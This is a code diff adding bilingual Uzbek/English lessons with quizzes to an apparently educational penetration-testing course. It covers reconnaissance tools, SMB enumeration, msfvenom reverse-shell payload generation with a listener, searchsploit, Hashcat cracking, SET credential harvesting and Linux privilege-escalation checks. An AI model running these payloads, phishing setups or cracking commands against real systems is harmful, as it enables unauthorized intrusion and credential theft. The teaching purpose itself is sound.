+      "theHarvester is an open-source intelligence (OSINT) tool. It gathers a target organization's email addresses, subdomains, employee names and IPs from public sources (search engines, PGP servers, Shodan) — without sending any packets to the target."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
+    React.createElement(Terminal,null,
+      "# Google orqali email va subdomenlar\ntheHarvester -d example.com -b google\n\n# Bir necha manba birdan\ntheHarvester -d example.com -b bing,duckduckgo,crtsh\n\n# Natijani HTML/XML'ga saqlash\ntheHarvester -d example.com -b all -f natija"
+    ),
+    React.createElement(P,null,t(lang,
+      "Bu passiv razvedka — nishon buni bilmaydi, chunki barcha ma'lumot uchinchi tomon manbalaridan olinadi. Topilgan email manzillar keyingi phishing yoki parol hujumlari uchun ro'yxat bo'lib xizmat qiladi.",
+      "This is passive reconnaissance — the target never knows, since all data comes from third-party sources. The discovered email addresses serve as a list for later phishing or password attacks."
+    )),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"crt.sh manbasi: ","The crt.sh source: ")),
+      t(lang,"crtsh manbasi SSL sertifikat shaffoflik jurnallaridan subdomenlarni topadi — bu ko'pincha yashirin ichki subdomenlarni ham ochib beradi.",
+        "The crtsh source finds subdomains from SSL certificate transparency logs — this often reveals hidden internal subdomains too.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"theHarvester qanday razvedka turiga misol?",en:"What type of reconnaissance is theHarvester an example of?"},
+      opts:[{uz:"Aktiv (nishonga to'g'ridan hujum)",en:"Active (directly probing the target)"},{uz:"Passiv (ochiq manba OSINT)",en:"Passive (open-source OSINT)"},{uz:"Ekspluatatsiya",en:"Exploitation"},{uz:"Post-ekspluatatsiya",en:"Post-exploitation"}],
+      correct:1,
+      exp:{uz:"theHarvester passiv OSINT vositasi — u ma'lumotni uchinchi tomon ochiq manbalaridan oladi va nishonga hech narsa yubormaydi.",en:"theHarvester is a passive OSINT tool — it pulls data from third-party public sources and sends nothing to the target."}
+    })
+  );
+}
+
+// ── L17: WhatWeb ──────────────────────────────────────────────
+function LessonL17(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"WhatWeb nima?","What is WhatWeb?")),
+    React.createElement(P,null,t(lang,
+      "WhatWeb — veb-saytning \"ostida\" qanday texnologiyalar ishlayotganini aniqlaydi: CMS (WordPress, Joomla), veb-server (Apache, Nginx), dasturlash tili, JavaScript kutubxonalari, analitika va hatto versiyalar. Bu zaifliklarni izlashning boshlanish nuqtasi.",
+      "WhatWeb identifies which technologies run 'under the hood' of a website: CMS (WordPress, Joomla), web server (Apache, Nginx), programming language, JavaScript libraries, analytics and even versions. This is the starting point for finding vulnerabilities."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
+    React.createElement(Terminal,null,
+      "# Oddiy tekshiruv\nwhatweb example.com\n\n# Batafsil (verbose) — ko'proq ma'lumot\nwhatweb -v example.com\n\n# Agressivlik darajasi (3 = ko'proq so'rov, aniqroq)\nwhatweb -a 3 example.com\n\n# Ko'p saytni birdan (fayldan)\nwhatweb -i targets.txt"
+    ),
+    React.createElement(P,null,t(lang,
+      "Masalan, WhatWeb saytda \"WordPress 5.2\" ekanini aniqlasa, siz o'sha aniq versiyaga tegishli ma'lum zaifliklarni (searchsploit wordpress 5.2) izlashingiz mumkin. Texnologiya + versiya = maqsadli hujum.",
+      "For example, if WhatWeb detects 'WordPress 5.2' on a site, you can look up known vulnerabilities for that exact version (searchsploit wordpress 5.2). Technology + version = a targeted attack."
+    )),
+    React.createElement(Quiz,{
+      q:{uz:"WhatWeb asosan nimani aniqlaydi?",en:"What does WhatWeb primarily identify?"},
+      opts:[{uz:"Parol hashlarini",en:"Password hashes"},{uz:"Veb-saytning texnologiya stekini",en:"A website's technology stack"},{uz:"Ochiq UDP portlarni",en:"Open UDP ports"},{uz:"WiFi parollarini",en:"WiFi passwords"}],
+      correct:1,
+      exp:{uz:"WhatWeb veb-sayt ortidagi texnologiyalarni (CMS, server, til, kutubxonalar va versiyalar) aniqlaydi — bu maqsadli zaiflik izlash uchun asos beradi.",en:"WhatWeb detects the technologies behind a website (CMS, server, language, libraries and versions) — providing a basis for targeted vulnerability research."}
+    })
+  );
+}
+
+// ── L18: enum4linux ───────────────────────────────────────────
+function LessonL18(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"enum4linux nima?","What is enum4linux?")),
+    React.createElement(P,null,t(lang,
+      "enum4linux — Windows va Samba tizimlaridan SMB protokoli orqali ma'lumot to'playdigan vosita. U foydalanuvchilar ro'yxati, guruhlar, ulashilgan papkalar (shares), parol siyosati va operatsion tizim ma'lumotlarini chiqarib olishga urinadi — ko'pincha autentifikatsiyasiz (null session).",
+      "enum4linux gathers information from Windows and Samba systems over the SMB protocol. It attempts to extract the user list, groups, shared folders (shares), password policy and OS details — often without authentication (a null session)."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
+    React.createElement(Terminal,null,
+      "# To'liq enumeratsiya (barcha tekshiruvlar)\nenum4linux -a 10.0.0.5\n\n# Faqat foydalanuvchilar\nenum4linux -U 10.0.0.5\n\n# Faqat ulashilgan papkalar\nenum4linux -S 10.0.0.5\n\n# Zamonaviy Python versiyasi\nenum4linux-ng -A 10.0.0.5"
+    ),
+    React.createElement(P,null,t(lang,
+      "\"Null session\" — bu foydalanuvchi nomi va parolsiz SMB'ga ulanish. Eski yoki noto'g'ri sozlangan Windows tizimlari null session'ga ruxsat beradi va bu butun foydalanuvchilar ro'yxatini ochib berishi mumkin.",
+      "A 'null session' is a connection to SMB with no username or password. Old or misconfigured Windows systems allow null sessions, which can leak the entire user list."
+    )),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"enum4linux 139 va 445 portlar (SMB) ochiq bo'lganda ishlaydi. Topilgan foydalanuvchi ismlari keyinchalik parol hujumlari uchun ishlatilishi mumkin — faqat ruxsat berilgan nishonlarda.",
+        "enum4linux works when ports 139 and 445 (SMB) are open. Discovered usernames may later be used in password attacks — only on authorized targets.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"enum4linux qaysi protokol orqali ma'lumot to'playdi?",en:"Over which protocol does enum4linux gather information?"},
+      opts:[{uz:"SMB",en:"SMB"},{uz:"DNS",en:"DNS"},{uz:"SMTP",en:"SMTP"},{uz:"SNMP",en:"SNMP"}],
+      correct:0,
+      exp:{uz:"enum4linux SMB protokoli (139/445 portlar) orqali Windows/Samba tizimlaridan foydalanuvchilar, guruhlar va ulashmalarni sanaydi.",en:"enum4linux uses the SMB protocol (ports 139/445) to enumerate users, groups and shares from Windows/Samba systems."}
+    })
+  );
+}
+
+// ── L19: SMB enumeration ──────────────────────────────────────
+function LessonL19(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"SMB va nima uchun muhim","SMB and why it matters")),
+    React.createElement(P,null,t(lang,
+      "SMB (Server Message Block) — Windows tarmoqlarida fayl va printerlarni ulashish protokoli. U 445-portda ishlaydi va korporativ tarmoqlarda hamma joyda uchraydi. Noto'g'ri sozlangan SMB ulashmalari maxfiy fayllar, parollar va konfiguratsiyalarni ochib berishi mumkin.",
+      "SMB (Server Message Block) is the file and printer sharing protocol in Windows networks. It runs on port 445 and is everywhere in corporate networks. Misconfigured SMB shares can expose confidential files, passwords and configurations."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Ulashmalarni sanash","Enumerating shares")),
+    React.createElement(Terminal,null,
+      "# Ulashmalar ro'yxati (anonim)\nsmbclient -L //10.0.0.5 -N\n\n# Barcha xostlarda ulashmalarni xaritalash\nsmbmap -H 10.0.0.5\n\n# Nmap SMB skriptlari\nnmap --script smb-enum-shares,smb-os-discovery -p445 10.0.0.5"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Ulashmaga ulanish","Connecting to a share")),
+    React.createElement(Terminal,null,
+      "# Muayyan ulashmaga ulanish\nsmbclient //10.0.0.5/Documents -N\n\n# Ichida: fayllarni ko'rish va yuklab olish\nsmb: \\> ls\nsmb: \\> get maxfiy.txt\nsmb: \\> exit"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"EternalBlue: ","EternalBlue: ")),
+      t(lang,"Eski SMBv1 (MS17-010, EternalBlue) tarixdagi eng mashhur zaifliklardan biri. nmap --script smb-vuln-ms17-010 bilan tekshirib ko'ring — u hali ham ko'p eski tizimlarda ochiq.",
+        "The old SMBv1 (MS17-010, EternalBlue) is one of the most famous vulnerabilities in history. Check for it with nmap --script smb-vuln-ms17-010 — it is still open on many legacy systems.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"SMB protokoli qaysi asosiy portda ishlaydi?",en:"On which main port does the SMB protocol run?"},
+      opts:[{uz:"22",en:"22"},{uz:"80",en:"80"},{uz:"445",en:"445"},{uz:"53",en:"53"}],
+      correct:2,
+      exp:{uz:"SMB asosan 445-portda (eski hollarda 139) ishlaydi va Windows tarmoqlarida fayl ulashish uchun ishlatiladi.",en:"SMB runs mainly on port 445 (139 in legacy cases) and is used for file sharing in Windows networks."}
+    })
+  );
+}
+
+
+// ── L22: msfvenom ─────────────────────────────────────────────
+function LessonL22(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"msfvenom nima?","What is msfvenom?")),
+    React.createElement(P,null,t(lang,
+      "msfvenom — Metasploit tarkibidagi payload (yuk) generatori. U turli formatlarda (.exe, .elf, .apk, .php) bajariladigan zararli yuklarni yaratadi. Bu yuklar nishonda ishga tushganda hujumchiga teskari ulanish (reverse shell) beradi. Bu vosita faqat ta'lim va ruxsat berilgan pentest uchun.",
+      "msfvenom is the payload generator inside Metasploit. It creates executable payloads in various formats (.exe, .elf, .apk, .php). When run on a target these payloads give the attacker a reverse connection (reverse shell). This tool is only for education and authorized pentesting."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Payload yaratish","Generating a payload")),
+    React.createElement(Terminal,null,
+      "# Umumiy shakl: -p payload LHOST=... LPORT=... -f format\n\n# Windows reverse shell (.exe)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe\n\n# Linux (.elf)\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f elf -o shell.elf\n\n# PHP veb-shell\nmsfvenom -p php/reverse_php LHOST=10.0.0.10 LPORT=4444 -f raw -o shell.php"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Ulanishni qabul qilish","Catching the connection")),
+    React.createElement(P,null,t(lang,
+      "Yuk nishonda ishga tushganda, u sizga qaytib ulanadi. Bu ulanishni qabul qilish uchun Metasploit'da tinglovchi (listener) sozlanadi:",
+      "When the payload runs on the target, it connects back to you. To catch this connection you set up a listener (handler) in Metasploit:"
+    )),
+    React.createElement(Terminal,null,
+      "msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.10\nset LPORT 4444\nrun"
+    ),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"LHOST — sizning (hujumchi) IP manzilingiz, LPORT — siz tinglayotgan port. Bunday yuklarni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda sinang.",
+        "LHOST is your (the attacker's) IP, LPORT is the port you listen on. Only test such payloads in your own lab or on targets with written authorization.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"msfvenom buyrug'ida LHOST nimani bildiradi?",en:"In an msfvenom command, what does LHOST specify?"},
+      opts:[{uz:"Nishonning IP manzili",en:"The target's IP address"},{uz:"Hujumchining (tinglovchining) IP manzili",en:"The attacker's (listener's) IP address"},{uz:"Lokal fayl nomi",en:"A local file name"},{uz:"Payload turi",en:"The payload type"}],
+      correct:1,
+      exp:{uz:"LHOST — teskari ulanish qaytadigan manzil, ya'ni hujumchining o'z IP'si. Nishon yuk ishga tushganda shu manzilga ulanadi.",en:"LHOST is the address the reverse connection returns to — the attacker's own IP. The target connects to it when the payload runs."}
+    })
+  );
+}
+
+// ── L23: searchsploit & Exploit-DB ────────────────────────────
+function LessonL23(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Exploit-DB va searchsploit","Exploit-DB and searchsploit")),
+    React.createElement(P,null,t(lang,
+      "Exploit-DB — dunyodagi eng katta ochiq ekspluatatsiya arxivi. searchsploit esa uning nusxasini Kali'da oflayn qidirish imkonini beradigan vosita. Nishon dasturi va versiyasini bilganingizdan so'ng, unga tegishli tayyor ekspluatatsiyani shu yerdan topasiz.",
+      "Exploit-DB is the world's largest public archive of exploits. searchsploit is the tool that lets you search a local copy of it offline in Kali. Once you know the target's software and version, you find a matching ready-made exploit here."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Qidirish","Searching")),
+    React.createElement(Terminal,null,
+      "# Dastur nomi bo'yicha qidirish\nsearchsploit apache 2.4\n\n# Aniq qidiruv (nomida)\nsearchsploit -t wordpress\n\n# Ma'lumotlar bazasini yangilash\nsearchsploit -u"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Ekspluatatsiyani ko'rish va nusxalash","Viewing and copying an exploit")),
+    React.createElement(Terminal,null,
+      "# Ekspluatatsiya kodini o'qish\nsearchsploit -x php/webapps/50123.php\n\n# Uni joriy katalogga nusxalash\nsearchsploit -m 50123\n\n# Endi kodni tahlil qilib, sozlab ishga tushirasiz"
+    ),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval uni o'qib, nima qilishini tushuning. Ba'zi \"ekspluatatsiyalar\" aslida sizning mashinangizga qarshi zararli kod bo'lishi mumkin.",
+        "Never blindly run exploit code from the internet — read it first and understand what it does. Some 'exploits' are actually malicious code aimed at your own machine.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},
+      opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready-made exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],
+      correct:1,
+      exp:{uz:"searchsploit Exploit-DB ning lokal nusxasidan ma'lum dastur va versiyaga mos ekspluatatsiyalarni oflayn qidiradi.",en:"searchsploit searches a local copy of Exploit-DB offline for exploits matching a known software and version."}
+    })
+  );
+}
+
+// ── L26: Hashcat ──────────────────────────────────────────────
+function LessonL26(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Hashcat nima?","What is Hashcat?")),
+    React.createElement(P,null,t(lang,
+      "Hashcat — dunyodagi eng tezkor parol hash buzuvchi. U GPU (video karta) quvvatidan foydalanib, sekundiga milliardlab parolni sinaydi. John the Ripper kabi oflayn ishlaydi, lekin katta hajmdagi ishlar uchun ancha tezroq.",
+      "Hashcat is the world's fastest password-hash cracker. Using GPU (graphics card) power, it tries billions of passwords per second. Like John the Ripper it works offline, but is far faster for large jobs."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Hujum rejimlari","Attack modes")),
+    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(200px,1fr))",gap:10,margin:"12px 0 16px"}},
+      [["-a 0",t(lang,"Lug'at hujumi (wordlist)","Dictionary (wordlist)")],
+       ["-a 3",t(lang,"Brute-force (maska bilan)","Brute-force (mask)")],
+       ["-a 6",t(lang,"Wordlist + maska","Wordlist + mask")],
+       ["-a 1",t(lang,"Kombinatsiya (ikki wordlist)","Combinator (two wordlists)")]].map((x,i)=>
+        React.createElement("div",{key:i,style:{background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,padding:"11px 14px"}},
+          React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)"}},x[0]),
+          React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",marginTop:4}},x[1])))
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Foydalanish","Usage")),
+    React.createElement(Terminal,null,
+      "# Lug'at hujumi (-m = hash turi, 0 = MD5)\nhashcat -m 0 -a 0 hashes.txt rockyou.txt\n\n# NTLM hashlar (-m 1000)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt\n\n# Maska hujumi: 8 belgi, harf+raqam\nhashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a\n\n# Buzilganlarni ko'rish\nhashcat -m 0 hashes.txt --show"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"Hash turini aniqlash: ","Identifying the hash type: ")),
+      t(lang,"To'g'ri -m qiymatini tanlash muhim. hashid yoki hash-identifier vositalari hash turini aniqlashga yordam beradi. Hashcat wiki'da barcha -m raqamlari ro'yxati bor.",
+        "Choosing the right -m value is important. The hashid or hash-identifier tools help determine the hash type. The Hashcat wiki lists all -m numbers.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Hashcat John the Ripper'dan asosiy farqi nimada?",en:"What is Hashcat's main difference from John the Ripper?"},
+      opts:[{uz:"U onlayn ishlaydi",en:"It works online"},{uz:"U GPU quvvatidan foydalanib ancha tezroq",en:"It uses GPU power and is much faster"},{uz:"U faqat MD5 buzadi",en:"It only cracks MD5"},{uz:"U parol yaratadi",en:"It creates passwords"}],
+      correct:1,
+      exp:{uz:"Hashcat GPU'dan foydalanib sekundiga milliardlab parolni sinaydi — bu uni katta ishlar uchun John'dan ancha tezroq qiladi. Ikkalasi ham oflayn.",en:"Hashcat leverages the GPU to try billions of passwords per second, making it much faster than John for large jobs. Both are offline."}
+    })
+  );
+}
+
+// ── L28: Social Engineering (SET) ─────────────────────────────
+function LessonL28(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Ijtimoiy muhandislik va SET","Social engineering and SET")),
+    React.createElement(P,null,t(lang,
+      "Ijtimoiy muhandislik — texnik zaifliklar emas, balki insonlarni aldash orqali hujum qilish. Eng kuchli himoya ham bitta ishonuvchan xodim tufayli buziladi. SET (Social-Engineer Toolkit) — bunday hujum stsenariylarini (phishing, soxta saytlar) yaratish uchun Kali vositasi.",
+      "Social engineering means attacking by deceiving people rather than exploiting technical flaws. Even the strongest defense breaks because of one trusting employee. SET (Social-Engineer Toolkit) is a Kali tool for building such attack scenarios (phishing, fake sites)."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Keng tarqalgan texnikalar","Common techniques")),
+    React.createElement("div",{style:{marginBottom:16}},
+      [[t(lang,"Phishing","Phishing"),t(lang,"Soxta email orqali ma'lumot yoki parol o'g'irlash","Stealing info or passwords via fake email")],
+       [t(lang,"Pretexting","Pretexting"),t(lang,"Ishonchli yolg'on stsenariy o'ylab topish (masalan IT xodimi)","Inventing a believable false scenario (e.g. IT staff)")],
+       [t(lang,"Baiting","Baiting"),t(lang,"Qiziqtiruvchi 'o'lja' (masalan zararli USB) qoldirish","Leaving an enticing 'bait' (e.g. a malicious USB)")],
+       [t(lang,"Credential Harvesting","Credential Harvesting"),t(lang,"Haqiqiy saytning soxta nusxasi bilan login o'g'irlash","Stealing logins with a fake clone of a real site")]].map((x,i)=>
+        React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
+          React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:150}},x[0]),
+          React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.5}},x[1])))
+    ),
+    React.createElement(Terminal,null,
+      "# SET'ni ishga tushirish\nsudo setoolkit\n\n# Menyu: 1) Social-Engineering Attacks\n#        2) Website Attack Vectors\n#        3) Credential Harvester Method"
+    ),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},
+      React.createElement("strong",null,"⚠ "),
+      t(lang,"Ijtimoiy muhandislik hujumlari faqat rasmiy, yozma ruxsat berilgan pentest doirasida (masalan tashkilotning o'z xodimlarini sinash) o'tkazilishi mumkin. Aks holda bu firibgarlik va jinoyat hisoblanadi.",
+        "Social engineering attacks may only be conducted within a formal, written-authorized pentest scope (e.g. testing an organization's own employees). Otherwise it is fraud and a crime.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Ijtimoiy muhandislik hujumi nimaga asoslanadi?",en:"What does a social engineering attack rely on?"},
+      opts:[{uz:"Dasturiy zaifliklarga",en:"Software vulnerabilities"},{uz:"Insonlarni aldash va ishonchdan foydalanishga",en:"Deceiving people and abusing trust"},{uz:"Tarmoq portlariga",en:"Network ports"},{uz:"Shifrlash xatolariga",en:"Encryption flaws"}],
+      correct:1,
+      exp:{uz:"Ijtimoiy muhandislik texnik emas, insoniy omilga qaratilgan — u odamlarni aldab, maxfiy ma'lumot yoki kirish huquqini berishga undaydi.",en:"Social engineering targets the human factor, not the technical one — it tricks people into handing over sensitive info or access."}
+    })
+  );
+}
+
+// ── L29: Privilege escalation ─────────────────────────────────
+function LessonL29(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Imtiyozlarni oshirish nima?","What is privilege escalation?")),
+    React.createElement(P,null,t(lang,
+      "Imtiyozlarni oshirish (privesc) — tizimga oddiy foydalanuvchi sifatida kirgandan so'ng, root (Linux) yoki Administrator (Windows) huquqlarini qo'lga kiritish jarayoni. Ko'p hujumlar past imtiyozli kirish bilan boshlanadi; privesc esa to'liq nazoratni beradi.",
+      "Privilege escalation (privesc) is the process of gaining root (Linux) or Administrator (Windows) rights after entering a system as a normal user. Many attacks start with low-privilege access; privesc gives full control."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Linux privesc — tekshiruv nuqtalari","Linux privesc — check points")),
+    React.createElement(Terminal,null,
+      "# Menda qanday sudo huquqlari bor?\nsudo -l\n\n# SUID o'rnatilgan fayllar (GTFOBins bilan solishtiring)\nfind / -perm -4000 -type f 2>/dev/null\n\n# Yozish mumkin bo'lgan cron ishlari\nls -la /etc/cron*\n\n# Kernel versiyasi (ma'lum ekspluatatsiya bormi?)\nuname -a"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Avtomatlashtirilgan vositalar","Automated tools")),
+    React.createElement(Terminal,null,
+      "# LinPEAS — Linux privesc tekshiruvchi\n./linpeas.sh\n\n# Linux Exploit Suggester — kernel ekspluatatsiyalarini taklif qiladi\n./linux-exploit-suggester.sh\n\n# Windows uchun: winPEAS.exe, PowerUp.ps1"
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"GTFOBins: ","GTFOBins: ")),
+      t(lang,"gtfobins.github.io — SUID yoki sudo huquqi bilan ishlaydigan oddiy dasturlarni (vim, find, less) qanday qilib root olishga aylantirish mumkinligini ko'rsatuvchi bebaho ma'lumotnoma.",
+        "gtfobins.github.io — an invaluable reference showing how ordinary programs (vim, find, less) with SUID or sudo rights can be turned into root access.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Linux'da imtiyozlarni oshirishning eng birinchi tekshiruvi qaysi?",en:"What is one of the very first privilege-escalation checks on Linux?"},
+      opts:[{uz:"sudo -l bilan sudo huquqlarini ko'rish",en:"Checking sudo rights with sudo -l"},{uz:"Kompyuterni o'chirish",en:"Shutting down the computer"},{uz:"Brauzerni ochish",en:"Opening a browser"},{uz:"Fonni o'zgartirish",en:"Changing the wallpaper"}],
+      correct:0,
+      exp:{uz:"sudo -l joriy foydalanuvchiga qanday sudo huquqlari berilganini ko'rsatadi — bu ko'pincha root'ga tez yo'l ochadi.",en:"sudo -l shows what sudo rights the current user has — this often opens a quick path to root."}
+    })
+  );
+}
+
+// ── L30: Covering tracks & reporting ──────────────────────────
+function LessonL30(){
+  const lang=useLang();
+  return React.createElement("section",null,
+    React.createElement(H2,{num:"§1"},t(lang,"Pentestning yakuniy bosqichi","The final phase of a pentest")),
+    React.createElement(P,null,t(lang,
+      "Haqiqiy hujumchilar izlarini yashiradi, lekin professional pentesterning eng muhim mahsuloti — hisobot. Sizning topilmalaringiz tushunarli, takrorlanadigan va tuzatib bo'ladigan tarzda hujjatlashtirilmasa, butun ish qiymatini yo'qotadi.",
+      "Real attackers cover their tracks, but a professional pentester's most important deliverable is the report. If your findings aren't documented in a clear, reproducible and fixable way, the entire engagement loses its value."
+    )),
+    React.createElement(H2,{num:"§2"},t(lang,"Izlarni yashirish (nazariy)","Covering tracks (conceptual)")),
+    React.createElement(P,null,t(lang,
+      "Hujumchilar loglarni tozalaydi va vaqt belgilarini o'zgartiradi. Mudofaachi (blue team) sifatida buni tushunish muhim — bu qaysi loglar himoyalanishi kerakligini ko'rsatadi. Pentestda esa siz bajargan barcha amallar hisobotda ochiq qayd etiladi, yashirilmaydi.",
+      "Attackers clear logs and alter timestamps. As a defender (blue team) it's important to understand this — it shows which logs must be protected. In a pentest, however, every action you take is openly recorded in the report, not hidden."
+    )),
+    React.createElement(Terminal,null,
+      "# Log fayllar odatda shu yerda (blue team bilishi shart):\n/var/log/auth.log     # kirish urinishlari\n/var/log/syslog       # umumiy tizim\n~/.bash_history       # kiritilgan buyruqlar\n\n# Himoya: loglarni markazlashtirilgan SIEM'ga uzatish"
+    ),
+    React.createElement(H2,{num:"§3"},t(lang,"Professional hisobot tuzilishi","Professional report structure")),
+    React.createElement("div",{style:{marginBottom:16}},
+      [["1. Executive Summary",t(lang,"Rahbariyat uchun texnik bo'lmagan qisqacha xulosa","Non-technical summary for management")],
+       ["2. Scope & Methodology",t(lang,"Nima test qilingani va qanday usulda","What was tested and how")],
+       ["3. Findings",t(lang,"Har bir zaiflik: tavsif, jiddiylik (CVSS), isbot","Each vuln: description, severity (CVSS), proof")],
+       ["4. Remediation",t(lang,"Har bir zaiflikni qanday tuzatish bo'yicha aniq tavsiyalar","Concrete fix recommendations per vuln")]].map((x,i)=>
+        React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
+          React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:180}},x[0]),
+          React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.5}},x[1])))
+    ),
+    React.createElement(InfoBox,{color:"var(--accent)"},
+      React.createElement("strong",null,t(lang,"Isbot (PoC): ","Proof of concept: ")),
+      t(lang,"Har bir topilma skrinshot, buyruq va qadamlar bilan hujjatlashtirilishi kerak, toki mijoz uni o'zi takrorlab, tuzatgach yana sinab ko'ra olsin. Hisobotsiz pentest — tugallanmagan pentest.",
+        "Every finding should be documented with screenshots, commands and steps so the client can reproduce it, fix it, then retest. A pentest without a report is an unfinished pentest.")
+    ),
+    React.createElement(Quiz,{
+      q:{uz:"Professional pentesterning eng muhim yakuniy mahsuloti nima?",en:"What is a professional pentester's most important final deliverable?"},
+      opts:[{uz:"Buzilgan tizimlar soni",en:"The number of systems breached"},{uz:"Aniq, takrorlanadigan va tuzatib bo'ladigan hisobot",en:"A clear, reproducible and fixable report"},{uz:"O'g'irlangan parollar",en:"Stolen passwords"},{uz:"Tozalangan loglar",en:"Cleared logs"}],
+      correct:1,
+      exp:{uz:"Pentestning qiymati hisobotda — topilmalar tushunarli, isbotlangan va tuzatish tavsiyalari bilan hujjatlashtirilishi shart.",en:"The value of a pentest is in the report — findings must be documented clearly, with proof and remediation guidance."}
     })
   );
 }
